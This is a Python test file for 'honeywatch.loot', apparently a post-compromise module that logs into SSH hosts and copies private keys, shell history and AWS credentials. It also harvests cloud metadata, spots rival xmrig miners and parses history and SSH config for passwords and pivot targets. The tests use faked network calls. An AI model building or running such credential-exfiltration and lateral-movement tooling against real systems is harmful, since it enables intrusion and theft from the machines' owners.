"""Tests for honeywatch.loot — credential exfil + intel parsing.

The SFTP/paramiko paths are exercised via a fake paramiko module (same pattern
as test_crack.py), so no real network is hit. The pure parsers
(parse_known_hosts, parse_ssh_config, parse_history_for_targets) are tested
directly — they're the pivot-discovery logic that makes the chain grow.
"""

from __future__ import annotations

import os
import sys
import types

import pytest

from honeywatch.loot import (
    LootResult,
    parse_history_for_targets,
    parse_known_hosts,
    parse_ssh_config,
)


# --------------------------------------------------------------------------- #
# Pure parsers — the pivot-discovery engine
# --------------------------------------------------------------------------- #


def test_parse_known_hosts_plain():
    text = "10.0.0.5 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQ...\n"
    hosts = parse_known_hosts(text)
    assert len(hosts) == 1
    assert hosts[0].host == "10.0.0.5"
    assert hosts[0].port == 22
    assert hosts[0].key_type == "ssh-rsa"


def test_parse_known_hosts_bracketed_port():
    text = "[192.168.1.10]:2222 ecdsa-sha2-nistp256 AAAA...\n"
    hosts = parse_known_hosts(text)
    assert hosts[0].host == "192.168.1.10"
    assert hosts[0].port == 2222


def test_parse_known_hosts_comma_list():
    text = "10.0.0.1,10.0.0.2,10.0.0.3 ssh-ed25519 AAAA...\n"
    hosts = parse_known_hosts(text)
    assert len(hosts) == 3
    assert {h.host for h in hosts} == {"10.0.0.1", "10.0.0.2", "10.0.0.3"}


def test_parse_known_hosts_skips_hashed():
    # Hashed hostnames (|1|...) can't be reversed — skip them.
    text = "|1|base64hash= ssh-rsa AAAA...\n10.0.0.5 ssh-rsa AAAA...\n"
    hosts = parse_known_hosts(text)
    assert len(hosts) == 1
    assert hosts[0].host == "10.0.0.5"


def test_parse_known_hosts_skips_blank_and_comments():
    text = "# comment\n\n  \n10.0.0.5 ssh-rsa AAAA...\n"
    hosts = parse_known_hosts(text)
    assert len(hosts) == 1


def test_parse_ssh_config_basic():
    text = """
Host jump-box
    HostName 10.1.2.3
    Port 2222
    User admin
    IdentityFile ~/.ssh/jump_key

Host internal
    HostName internal.corp
    User root
"""
    blocks = parse_ssh_config(text)
    assert len(blocks) == 2
    assert blocks[0]["host"] == "jump-box"
    assert blocks[0]["hostname"] == "10.1.2.3"
    assert blocks[0]["port"] == "2222"
    assert blocks[0]["user"] == "admin"
    assert blocks[0]["identityfile"] == "~/.ssh/jump_key"
    assert blocks[1]["hostname"] == "internal.corp"


def test_parse_history_for_targets_ssh():
    text = """
ssh root@10.0.0.5
scp file.tar user@192.168.1.10:/tmp/
ssh -p 2222 admin@internal.host
curl http://10.2.3.4:8080/api
"""
    hosts, passwords = parse_history_for_targets(text)
    assert "10.0.0.5" in hosts
    assert "192.168.1.10" in hosts
    assert "internal.host" in hosts
    assert "10.2.3.4" in hosts
    # 127.x must be filtered out.
    assert all(not h.startswith("127.") for h in hosts)


def test_parse_history_for_targets_passwords():
    text = """
export PASSWORD=hunter2
DB_PWD=SuperSecret123
TOKEN=abc123xyz
API_KEY=sk-12345
"""
    hosts, passwords = parse_history_for_targets(text)
    assert "hunter2" in passwords
    assert "SuperSecret123" in passwords
    assert "abc123xyz" in passwords
    assert "sk-12345" in passwords


def test_parse_history_for_targets_dedup():
    text = "ssh root@10.0.0.5\nssh root@10.0.0.5\n"
    hosts, _ = parse_history_for_targets(text)
    assert hosts.count("10.0.0.5") == 1


def test_loot_result_summary():
    res = LootResult(ip="10.0.0.5", port=22, user="root")
    res.files = {"/tmp/a": "x", "/tmp/b": "y"}
    res.ssh_keys = ["/tmp/key"]
    res.cloud_creds = {"aws_credentials": "/tmp/aws"}
    res.pivot_targets = ["10.0.0.6"]
    summary = res.summary()
    assert "10.0.0.5:22" in summary
    assert "2 file(s)" in summary
    assert "1 ssh key(s)" in summary
    assert "1 cloud cred(s)" in summary
    assert "1 pivot target(s)" in summary


def test_loot_result_summary_empty():
    res = LootResult(ip="10.0.0.5", port=22)
    assert res.summary() == "10.0.0.5:22"


# --------------------------------------------------------------------------- #
# grab_loot with a fake paramiko (no real network)
# --------------------------------------------------------------------------- #


def _fake_paramiko():
    """A fake paramiko module that 'authenticates' and serves a SFTP + channel."""

    class FakeSFTP:
        def __init__(self):
            self.files = {
                "/home/user/.ssh/known_hosts": b"10.0.0.10 ssh-rsa AAAA\n",
                "/home/user/.ssh/id_rsa": b"-----BEGIN RSA PRIVATE KEY-----\n",
                "/home/user/.bash_history": b"ssh root@10.0.0.20\n",
                "/home/user/.aws/credentials": b"[default]\naws_access_key_id=AKIA123\n",
            }

        def get(self, remote, local):
            data = self.files.get(remote)
            if data is None:
                raise FileNotFoundError(remote)
            with open(local, "wb") as fh:
                fh.write(data)

        def close(self):
            pass

    class FakeChannel:
        def __init__(self):
            self._buf = (
                b"---aws_roles---\nmy-role\n"
                b"---aws_instance_id---\ni-abc123def\n"
                b"---competing_miners---\nroot 1234 0.0 0.0 12345 ? 0.0 /tmp/xmrig\n"
            )
            self._sent = False

        def settimeout(self, s):
            pass

        def exec_command(self, cmd):
            pass

        def recv_ready(self):
            return not self._sent

        def recv(self, n):
            if self._sent:
                return b""
            self._sent = True
            return self._buf

        def recv_stderr_ready(self):
            return False

        def recv_stderr(self, n):
            return b""

        def exit_status_ready(self):
            return self._sent

    class FakeTransport:
        def __init__(self, sock):
            pass

        _CLIENT_IDENTITY = ""
        local_version = ""

        def set_timeout(self, s):
            pass

        def start_client(self, timeout=None):
            pass

        def auth_password(self, user, pw):
            pass

        def auth_publickey(self, user, pkey):
            pass

        def SFTPClient_from_transport(self, t):
            return FakeSFTP()

        def open_session(self):
            return FakeChannel()

        def close(self):
            pass

    class FakeSocket:
        @staticmethod
        def create_connection(addr, timeout=None):
            return types.SimpleNamespace(settimeout=lambda s: None)

    mod = types.ModuleType("paramiko")
    mod.Transport = FakeTransport
    mod.AuthenticationException = Exception
    mod.SSHException = Exception
    mod.SFTPClient = types.SimpleNamespace(from_transport=lambda t: FakeSFTP())
    return mod


def _fake_socket_module():
    mod = types.ModuleType("socket")
    mod.create_connection = lambda addr, timeout=None: types.SimpleNamespace(
        settimeout=lambda s: None
    )
    return mod


def test_grab_loot_exfils_files_and_parses_targets(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "paramiko", _fake_paramiko())
    # loot.py does `import socket` at module top, so by the time the full
    # suite runs loot.socket is already the real module. Patching
    # sys.modules["socket"] only affects NEW imports, not the already-bound
    # loot.socket reference — the real socket.create_connection("10.0.0.5")
    # would hit the network and time out. Patch the attribute on the real
    # module that loot.py already imported (same pattern as the N2 leak test).
    import socket as real_socket

    class _FakeSock:
        def settimeout(self, s):
            pass

    monkeypatch.setattr(
        real_socket, "create_connection", lambda addr, timeout=None: _FakeSock()
    )

    from honeywatch.loot import grab_loot

    stash = str(tmp_path / "loot")
    res = grab_loot(
        ip="10.0.0.5", port=22, user="user", password="pw",
        stash_dir=stash, timeout_s=2.0,
    )
    assert res.error is None
    # Files were exfiltrated.
    assert len(res.files) >= 4
    # SSH private keys recovered (known_hosts is NOT a private key).
    assert len(res.ssh_keys) == 1
    assert any("ssh_id_rsa" in k for k in res.ssh_keys)
    # Cloud creds detected.
    assert "aws_credentials" in res.cloud_creds
    # AWS metadata harvested.
    assert res.metadata.get("aws_instance_id") == "i-abc123def"
    assert res.metadata.get("aws_roles") == "my-role"
    # Competing miner detected.
    assert "xmrig" in res.competing_miners
    # Pivot targets parsed from known_hosts.
    assert "10.0.0.10" in res.pivot_targets
    # Internal hosts parsed from bash_history.
    assert "10.0.0.20" in res.internal_hosts


def test_grab_loot_no_credential_returns_error(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "paramiko", _fake_paramiko())
    from honeywatch.loot import grab_loot

    res = grab_loot(ip="10.0.0.5", user="root", stash_dir=str(tmp_path / "x"))
    assert res.error is not None
    assert "no credential" in res.error


def test_grab_loot_no_user_returns_error(tmp_path, monkeypatch):
    monkeypatch.setitem(sys.modules, "paramiko", _fake_paramiko())
    from honeywatch.loot import grab_loot

    res = grab_loot(ip="10.0.0.5", password="pw", stash_dir=str(tmp_path / "x"))
    assert res.error is not None
    assert "no ssh user" in res.error


# --------------------------------------------------------------------------- #
# N2: socket leak when paramiko.Transport() raises. The socket must be closed
# in the finally block even when the Transport constructor throws before t is
# bound (otherwise a raw fd leaks per failed foothold).
# --------------------------------------------------------------------------- #


def test_grab_loot_closes_socket_when_transport_constructor_raises(tmp_path, monkeypatch):
    """If paramiko.Transport(sock) raises, the raw socket must be closed —
    the finally block can't rely on transport.close() because transport is
    still None at that point."""

    closed_socks: list = []

    class LeakyTransport:
        def __init__(self, sock):
            # Simulate a constructor failure (e.g. paramiko version mismatch).
            raise RuntimeError("Transport init failed")

    class FakeSock:
        def settimeout(self, s):
            pass

        def close(self):
            closed_socks.append(self)

    fake_paramiko = types.ModuleType("paramiko")
    fake_paramiko.Transport = LeakyTransport
    fake_paramiko.AuthenticationException = Exception
    fake_paramiko.SSHException = Exception
    monkeypatch.setitem(sys.modules, "paramiko", fake_paramiko)

    # Patch socket.create_connection on the REAL socket module that loot.py
    # already imported (monkeypatching sys.modules['socket'] doesn't affect
    # the bound name in loot.py's namespace).
    import socket as real_socket
    monkeypatch.setattr(
        real_socket, "create_connection", lambda addr, timeout=None: FakeSock()
    )

    from honeywatch.loot import grab_loot

    res = grab_loot(
        ip="10.0.0.5", port=22, user="root", password="pw",
        stash_dir=str(tmp_path / "loot"), timeout_s=2.0,
    )
    # The Transport init failure is recorded as an error...
    assert res.error is not None
    # ...AND the raw socket was closed (no fd leak).
    assert len(closed_socks) == 1